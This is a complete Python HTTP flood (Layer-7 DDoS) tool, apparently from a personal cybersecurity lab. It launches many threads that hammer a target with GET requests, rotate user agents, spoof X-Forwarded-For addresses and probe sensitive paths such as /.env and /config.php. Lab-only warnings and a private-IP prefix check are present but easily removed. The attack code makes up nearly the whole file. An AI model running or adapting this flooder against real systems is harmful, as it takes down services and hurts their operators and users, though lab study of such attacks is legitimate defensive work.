#!/usr/bin/env python3
"""
===========================================================================
 HTTP Flood Attack Simulator
 DDoS Simulation Lab — Personal Cybersecurity Research
 Author  : Cleveland Henry
 Target  : VirtualBox Lab VM (Isolated Network)
 Purpose : Educational simulation of Layer-7 HTTP flood behaviour
 WARNING : Authorised lab use ONLY. Illegal on real/production systems.
===========================================================================
"""
 
import socket
import threading
import time
import random
import argparse
import sys
import json
import os
from datetime import datetime
 
# ── Config ────────────────────────────────────────────────────────────────────
 
LOG_FILE = os.path.join(os.path.dirname(__file__), "..", "logs", "http_flood.log")
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
 
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Mobile Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/121.0 Firefox/121.0",
    "curl/8.4.0",
    "python-requests/2.31.0",
    "Wget/1.21.3 (linux-gnu)",
]
 
URL_PATHS = [
    "/", "/index.html", "/login", "/search?q=test",
    "/api/data", "/about", "/contact", "/products",
    "/wp-admin", "/admin", "/.env", "/config.php",
]
 
stats = {
    "requests_sent": 0,
    "successful":    0,
    "failed":        0,
    "start_time":    None,
    "target":        "",
    "duration":      0,
    "errors": 0,
}
 
lock = threading.Lock()
 
 
# ── Logging ───────────────────────────────────────────────────────────────────
 
def log(msg: str, level: str = "INFO") -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] [{level}] {msg}"
    print(line)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")
 
 
# ── HTTP Request Builder ──────────────────────────────────────────────────────
 
def build_http_get(host: str, path: str) -> bytes:
    ua      = random.choice(USER_AGENTS)
    referer = f"http://{host}/"
    cache   = random.choice(["no-cache", "no-store", "max-age=0"])
 
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {ua}\r\n"
        f"Accept: text/html,application/xhtml+xml,*/*;q=0.9\r\n"
        f"Accept-Language: en-US,en;q=0.5\r\n"
        f"Accept-Encoding: gzip, deflate\r\n"
        f"Cache-Control: {cache}\r\n"
        f"Referer: {referer}\r\n"
        f"Connection: keep-alive\r\n"
        f"X-Forwarded-For: {_random_ip()}\r\n"
        f"\r\n"
    )
    return request.encode()
 
 
def _random_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))
 
 
# ── Flood Worker ──────────────────────────────────────────────────────────────
 
def http_worker(target_ip: str, target_port: int, stop_event: threading.Event) -> None:
    while not stop_event.is_set():
        path = random.choice(URL_PATHS)
        req  = build_http_get(target_ip, path)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, target_port))
            sock.send(req)
            # Attempt to read response status
            resp = sock.recv(256).decode(errors="ignore")
            sock.close()
            with lock:
                stats["requests_sent"] += 1
                if "HTTP/" in resp:
                    stats["successful"] += 1
                else:
                    stats["failed"] += 1
        except Exception:
            with lock:
                stats["requests_sent"] += 1
                stats["failed"]        += 1
                stats["errors"]        += 1
 
 
# ── Orchestrator ──────────────────────────────────────────────────────────────
 
def run_http_flood(
    target_ip: str,
    target_port: int,
    duration: int,
    threads: int,
) -> dict:
    log(f"═══════════════════════════════════════════════════")
    log(f"  HTTP FLOOD SIMULATION STARTING")
    log(f"  Target  : http://{target_ip}:{target_port}")
    log(f"  Duration: {duration}s  |  Threads: {threads}")
    log(f"  WARNING : AUTHORISED LAB ENVIRONMENT ONLY")
    log(f"═══════════════════════════════════════════════════")
 
    stats["target"]     = f"{target_ip}:{target_port}"
    stats["duration"]   = duration
    stats["start_time"] = datetime.now().isoformat()
 
    stop_event = threading.Event()
    workers    = [
        threading.Thread(
            target=http_worker,
            args=(target_ip, target_port, stop_event),
            daemon=True,
        )
        for _ in range(threads)
    ]
    for w in workers:
        w.start()
 
    end_time = time.time() + duration
    try:
        while time.time() < end_time:
            elapsed = duration - (end_time - time.time())
            rps = stats["requests_sent"] / max(elapsed, 0.1)
            success_rate = (
                (stats["successful"] / stats["requests_sent"] * 100)
                if stats["requests_sent"] else 0
            )
            sys.stdout.write(
                f"\r  🌊 Requests: {stats['requests_sent']:,}  |  "
                f"OK: {stats['successful']:,}  |  "
                f"Fail: {stats['failed']:,}  |  "
                f"Rate: {rps:,.1f} req/s  |  "
                f"Elapsed: {elapsed:.1f}s   "
            )
            sys.stdout.flush()
            time.sleep(0.5)
    except KeyboardInterrupt:
        log("\nSimulation interrupted by user.", "WARN")
 
    stop_event.set()
    for w in workers:
        w.join(timeout=2)
 
    stats["end_time"] = datetime.now().isoformat()
    total_time = (
        datetime.fromisoformat(stats["end_time"]) -
        datetime.fromisoformat(stats["start_time"])
    ).total_seconds()
    stats["avg_rps"]       = round(stats["requests_sent"] / max(total_time, 1), 2)
    stats["success_rate"]  = round(
        stats["successful"] / max(stats["requests_sent"], 1) * 100, 2
    )
 
    log(f"\n  Simulation complete. Total requests : {stats['requests_sent']:,}")
    log(f"  Successful: {stats['successful']:,}  |  Failed: {stats['failed']:,}")
    log(f"  Average rate: {stats['avg_rps']} req/s")
 
    result_path = os.path.join(
        os.path.dirname(__file__), "..", "logs", "http_results.json"
    )
    with open(result_path, "w") as f:
        json.dump(stats, f, indent=2)
    log(f"  Results saved to {result_path}")
 
    return stats
 
 
# ── CLI Entry ─────────────────────────────────────────────────────────────────
 
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="HTTP Flood Simulator — DDoS Lab (Authorised Lab Only)",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument("target",               help="Target IP address (lab VM only)")
    parser.add_argument("-p", "--port",         type=int, default=80,  help="Target port (default: 80)")
    parser.add_argument("-d", "--duration",     type=int, default=30,  help="Duration in seconds (default: 30)")
    parser.add_argument("-t", "--threads",      type=int, default=50,  help="Number of threads (default: 50)")
 
    args = parser.parse_args()
 
    allowed_ranges = ("192.168.", "10.", "172.16.", "127.")
    if not any(args.target.startswith(r) for r in allowed_ranges):
        log("Target IP does not appear to be a private/lab address. Aborting for safety.", "ERROR")
        log("This tool is strictly for isolated VirtualBox lab environments.", "ERROR")
        sys.exit(1)
 
    run_http_flood(args.target, args.port, args.duration, args.threads)
